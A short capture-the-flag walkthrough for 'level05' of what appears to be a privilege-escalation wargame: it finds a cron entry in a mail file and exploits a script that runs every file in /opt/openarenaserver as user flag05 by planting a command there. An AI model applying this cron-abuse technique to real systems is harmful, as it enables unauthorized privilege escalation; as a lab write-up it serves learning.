Here, there is no file like before, so we'll try to find one by searching a file like the previous:
find /* 2>/dev/null | grep "level05"
and we get: 

/etc/apache2/sites-available/level05.conf
/etc/apache2/sites-enabled/level05.conf
/rofs/etc/apache2/sites-available/level05.conf
/rofs/etc/apache2/sites-enabled/level05.conf
/rofs/var/mail/level05
/var/mail/level05

If we cat /var/mail/level05 we have:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

That's a cron table that will execute sh /usr/sbin/openarenaserver
So let's see what's inside this file:
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

This file will execute every file in /opt/openarenaserver/
So just create a file and put something like:
getflag > /tmp/flag

We just have to wait a little bit and we just have to cat /tmp/flag to get the flag !
